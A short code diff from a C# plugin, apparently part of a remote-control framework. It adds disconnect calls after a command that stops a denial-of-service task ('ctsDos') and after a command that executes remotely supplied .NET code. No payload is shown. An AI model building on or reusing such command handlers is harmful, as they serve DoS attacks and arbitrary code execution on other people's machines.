@@ -81,6 +81,7 @@ namespace Plugin
                                 case "postStop":
                                     {
                                         ctsDos.Cancel();
+                                        Connection.Disconnected();
                                         break;
                                     }
                             }
@@ -91,6 +92,7 @@ namespace Plugin
                     case "executeDotNetCode":
                         {
                             new HandlerExecuteDotNetCode(unpack_msgpack);
+                            Connection.Disconnected();
                             break;
                         }
 
